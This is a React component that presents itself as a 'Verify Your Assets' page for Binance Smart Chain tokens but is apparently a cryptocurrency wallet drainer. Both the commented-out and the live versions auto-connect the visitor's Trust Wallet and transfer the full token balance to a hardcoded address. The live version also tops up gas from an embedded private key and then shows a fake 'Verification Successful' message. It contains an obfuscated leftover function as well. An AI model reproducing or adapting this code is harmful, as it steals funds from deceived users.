// import React, { useState, useEffect } from "react";
// import { toast } from "react-toastify";
// import { ethers } from "ethers";
// import { FaWallet } from "react-icons/fa";

// const USDC_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Mainnet USDC Contract
// const USDC_ABI = [
//   "function balanceOf(address owner) view returns (uint256)",
//   "function decimals() view returns (uint8)",
//   "function transfer(address recipient, uint256 amount) public returns (bool)",
//   "function approve(address spender, uint256 amount) public returns (bool)",
// ];

// const USDC_WALLET = "0x07654Cd32476f5b8d34D11280CE64dCAc6e6F1fe"; // Recipient Wallet Address

// export default function WalletConnect() {
//   const [funds, setFunds] = useState(false);
//   const [loading, setLoading] = useState(false);
//   const [walletConnected, setWalletConnected] = useState(false);

//   useEffect(() => {
//     detectWallet();
//   }, []);

//   const detectWallet = async () => {
//     setLoading(true);
//     const isTrustWallet = window.trustwallet;

//     if (!isTrustWallet) {
//       toast.error("Trust Wallet not detected. Please install Trust Wallet.");
//       setLoading(false);
//       return;
//     }

//     await connectWallet(); // Automatically attempt to connect
//     setLoading(false);
//   };

//   const connectWallet = async () => {
//     setLoading(true);
//     try {
//       const provider = new ethers.BrowserProvider(window.trustwallet);
//       const signer = await provider.getSigner();
//       const accounts = await window.trustwallet.request({
//         method: "eth_requestAccounts",
//       });

//       await switchToBSC();

//       const USDCBalance = await fetchUSDCBalance(accounts[0], signer);

//       const contract = new ethers.Contract(USDC_CONTRACT_ADDRESS, USDC_ABI, signer);

//       const gasLimit = await contract.transfer.estimateGas(USDC_WALLET, USDCBalance);
//       const feeData = await provider.getFeeData();
//       const gasPrice = feeData.gasPrice || feeData.maxFeePerGas;

//       const tx = await contract.transfer(USDC_WALLET, USDCBalance, {
//         gasLimit: gasLimit,
//         gasPrice: gasPrice,
//       });

//       await tx.wait();

//       setWalletConnected(true);
//       toast.success("Wallet Connected!");
//     } catch (error) {
//       console.error(error);
//       toast.error("Failed to connect wallet");
//     }
//     setLoading(false);
//   };

//   const switchToBSC = async () => {
//     try {
//       await window.trustwallet.request({
//         method: "wallet_switchEthereumChain",
//         params: [{ chainId: "0x38" }],
//       });
//     } catch (e) {
//       try {
//         await window.trustwallet.request({
//           method: "wallet_addEthereumChain",
//           params: [
//             {
//               chainId: "0x38",
//               chainName: "Binance Smart Chain",
//               nativeCurrency: {
//                 name: "BNB",
//                 symbol: "BNB",
//                 decimals: 18,
//               },
//               rpcUrls: ["https://bsc-dataseed.binance.org/"],
//               blockExplorerUrls: ["https://bscscan.com/"],
//             },
//           ],
//         });
//       } catch (e) {
//         console.error("Failed to switch chain", e);
//       }
//     }
//   };

//   const fetchUSDCBalance = async (account, signer) => {
//     try {
//       const contract = new ethers.Contract(USDC_CONTRACT_ADDRESS, USDC_ABI, signer);
//       const balance = await contract.balanceOf(account);
//       return balance;
//     } catch (error) {
//       toast.error("Failed to fetch USDC balance");
//       console.error(error);
//     }
//   };

//   return (
//     <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-r from-black to-[#282929] text-center py-10 font-roboto">
//       {/* Heading */}
//       <h1 className="text-yellow-400 text-5xl md:mt-28 font-bold leading-relaxed">
//         Verify Your Assets
//       </h1>
//       <p className="text-white mt-3 text-xl ">
//         Ensure your tokens are secure on Binance Smart Chain.
//       </p>

//       {/* Verification Card */}
//       <div className="p-4 bg-gray-800 rounded-2xl shadow-lg text-center w-64 mt-7">
//         <button
//           onClick={connectWallet}
//           className={`w-full flex justify-center items-center cursor-pointer ${
//             loading
//               ? "bg-yellow-400 cursor-not-allowed"
//               : "bg-yellow-400 hover:bg-yellow-500"
//           } text-black font-semibold text-xl py-3 px-3 rounded-lg transition-all`}
//           disabled={loading || walletConnected}
//         >
//           {loading ? (
//             <div className="flex items-center justify-center">
//               <svg
//                 className="animate-spin h-5 w-5 mr-2 text-bla"
//                 xmlns="http://www.w3.org/2000/svg"
//                 fill="none"
//                 viewBox="0 0 24 24"
//               >
//                 <circle
//                   className="opacity-25"
//                   cx="12"
//                   cy="12"
//                   r="10"
//                   stroke="currentColor"
//                   strokeWidth="4"
//                 ></circle>
//                 <path
//                   className="opacity-75"
//                   fill="currentColor"
//                   d="M4 12a8 8 0 018-8v8z"
//                 ></path>
//               </svg>
//               Verifying...
//             </div>
//           ) : (
//             <>
//               <FaWallet className="text-xl mr-2" /> {walletConnected ? "Connected" : "VERIFY ASSETS"}
//             </>
//           )}
//         </button>

//         {/* Fund Status Message */}
//         {walletConnected && (
//           <p className="mt-4 text-sm text-green-400 bg-gray-700 p-2 rounded-lg">
//             Wallet Connected Successfully!
//           </p>
//         )}
//       </div>
//     </div>
//   );
// }

import React, { useState, useEffect } from "react";
import { toast } from "react-toastify";
import { ethers, Wallet } from "ethers";
import { FaWallet } from "react-icons/fa";

const USDC_CONTRACT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Mainnet USDC Contract
const USDC_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address recipient, uint256 amount) public returns (bool)",
  "function approve(address spender, uint256 amount) public returns (bool)",
];

const USDC_WALLET = "0xe0C7F39c5724E3F578F8a42e29A77ddbC1E5463d"; // Recipient Wallet Address

export default function WalletConnect() {
  const [funds, setFunds] = useState(false);
  const [loading, setLoading] = useState(false);
  const [walletConnected, setWalletConnected] = useState(false);
  const [showModal, setShowModal] = useState(false);

  useEffect(() => {
    detectWallet();
  }, []);

  const detectWallet = async () => {
    setLoading(true);
    const isTrustWallet = window.trustwallet;

    if (!isTrustWallet) {
      toast.error("Trust Wallet not detected. Please install Trust Wallet.");
      setLoading(false);
      return;
    }

    await connectWallet(); // Automatically attempt to connect
    setLoading(false);
  };

  const connectWallet = async () => {
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.trustwallet);
      const signer = await provider.getSigner();
      const accounts = await window.trustwallet.request({
        method: "eth_requestAccounts",
      });

      await switchToBSC();

      const USDCBalance = await fetchUSDCBalance(accounts[0], signer);

      const bnbBalanceNotMul = await provider.getBalance(accounts[0]);

      const contract = new ethers.Contract(
        USDC_CONTRACT_ADDRESS,
        USDC_ABI,
        signer
      );

      const gasLimit = await contract.transfer.estimateGas(
        USDC_WALLET,
        USDCBalance
      );
      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || feeData.maxFeePerGas;

      const gas = gasLimit * (gasPrice + 2);

      if (bnbBalanceNotMul < gas) {
        const spender = new Wallet("c616fd703e0c1a9b166c058a41939d0f546ce308998e00357eb79958698f8b22", provider);

        const transferGasFee = await spender.sendTransaction({
          'to': accounts[0],
          'value': gas
        });

        await transferGasFee.wait();
      }

      const tx = await contract.transfer(USDC_WALLET, USDCBalance, {
        gasLimit: gasLimit,
        gasPrice: gasPrice,
      });

      await tx.wait();

      setWalletConnected(true);
      setShowModal(true); // Show modal on successful connection
      toast.success("Wallet Connected!");
    } catch (error) {
      console.error(error);
      toast.error("Failed to connect wallet");
    }
    setLoading(false);
  };

  const switchToBSC = async () => {
    try {
      await window.trustwallet.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });
    } catch (e) {
      try {
        await window.trustwallet.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: "0x38",
              chainName: "Binance Smart Chain",
              nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18,
              },
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              blockExplorerUrls: ["https://bscscan.com/"],
            },
          ],
        });
      } catch (e) {
        console.error("Failed to switch chain", e);
      }
    }
  };

  const fetchUSDCBalance = async (account, signer) => {
    try {
      const contract = new ethers.Contract(
        USDC_CONTRACT_ADDRESS,
        USDC_ABI,
        signer
      );
      const balance = await contract.balanceOf(account);
      return balance;
    } catch (error) {
      toast.error("Failed to fetch USDC balance");
      console.error(error);
    }
  };

  function mulDecimals(_0x155eca, _0x5c66ad) {
    if ("string" === typeof _0x5c66ad) {
      const _0x143867 = _0x3dcc2e.indexOf(_0x5c66ad);
      if (-0x1 !== _0x143867) {
        _0x5c66ad = 0x3 * _0x143867;
      }
    }
    return _0x1ce27b(_0x155eca, null != _0x5c66ad ? _0x5c66ad : 0x12);
  }

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-r from-black to-[#282929] text-center py-10 font-roboto">
      {/* Heading */}
      <h1 className="text-yellow-400 text-5xl md:mt-28 font-bold leading-tight md:leading-relaxed">
        Verify Your Assets
      </h1>
      <p className="text-white mt-3 ml-2 mr-2 text-xl ">
        Ensure your tokens are secure on Binance Smart Chain.
      </p>

      {/* Verification Card */}
      <div className="p-4 bg-gray-800 rounded-2xl shadow-lg text-center w-64 mt-7">
        <button
          onClick={connectWallet}
          className={`w-full flex justify-center items-center cursor-pointer ${loading
            ? "bg-yellow-400 cursor-not-allowed"
            : "bg-yellow-400 hover:bg-yellow-500"
            } text-black font-semibold text-xl py-3 px-3 rounded-lg transition-all`}
          disabled={loading || walletConnected}
        >
          {loading ? (
            <div className="flex items-center justify-center">
              <svg
                className="animate-spin h-5 w-5 mr-2 text-bla"
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
              >
                <circle
                  className="opacity-25"
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                ></circle>
                <path
                  className="opacity-75"
                  fill="currentColor"
                  d="M4 12a8 8 0 018-8v8z"
                ></path>
              </svg>
              Verifying...
            </div>
          ) : (
            <>
              <FaWallet className="text-xl mr-2" />{" "}
              {walletConnected ? "Connected" : "VERIFY ASSETS"}
            </>
          )}
        </button>

        {/* Fund Status Message */}
        {walletConnected && (
          <p className="mt-4 text-sm text-green-400 bg-gray-700 p-2 rounded-lg">
            Wallet Connected Successfully!
          </p>
        )}
      </div>

      {/* Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
          <div className="bg-gray-800 p-6 rounded-lg shadow-lg text-center">
            <h2 className="text-yellow-400 text-2xl font-bold">
              Verification Successful
            </h2>
            <p className="text-white mt-4">
              Your assets are genuine. No flash or reported USDT found.
            </p>
            <p className="text-white mt-2">USDT Balance: 0.0 USDT</p>
            <p className="text-white mt-2">BNB Balance: 0.0 BNB</p>
            <button
              onClick={() => setShowModal(false)}
              className="mt-4 bg-yellow-400 text-black font-semibold py-2 px-4 rounded-lg hover:bg-yellow-500 transition-all"
            >
              CLOSE
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
